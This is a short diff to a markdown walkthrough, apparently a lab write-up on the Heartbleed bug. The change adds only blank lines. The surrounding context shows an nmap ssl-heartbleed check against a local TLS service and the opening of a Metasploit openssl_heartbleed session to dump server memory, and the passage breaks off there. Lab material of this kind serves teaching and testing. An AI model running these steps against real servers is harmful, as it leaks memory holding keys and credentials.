@@ -41,6 +41,7 @@ The Heartbeat extension allows a client or server to verify that the secure conn
 ## Exploitation Walkthrough
 
 ### 1. Verification with Nmap Heartbleed Script
+
 Verify that the target TLS service is vulnerable to Heartbleed:
 
 ```bash
@@ -50,6 +51,7 @@ nmap -p 8443 --script ssl-heartbleed localhost
 The output will state `VULNERABLE: The Heartbleed Bug`.
 
 ### 2. Dumping Memory with Metasploit
+
 ```bash
 msfconsole -q
 use auxiliary/scanner/ssl/openssl_heartbleed
